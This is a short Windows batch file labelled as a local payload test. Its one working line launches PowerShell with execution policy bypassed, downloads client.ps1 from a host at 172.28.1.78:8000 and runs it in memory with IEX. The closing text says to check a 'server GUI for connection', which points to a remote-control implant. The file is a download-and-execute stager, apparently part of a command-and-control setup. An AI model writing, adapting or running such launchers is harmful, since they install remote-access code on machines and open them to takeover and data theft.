@echo off
echo ================================================
echo   TESTING PAYLOAD LOCALLY
echo ================================================
echo.
echo This will test the payload on YOUR PC
echo Make sure servers are running first!
echo.
pause

REM Start the payload command
powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"

echo.
echo Test complete. Check your server GUI for connection.
pause
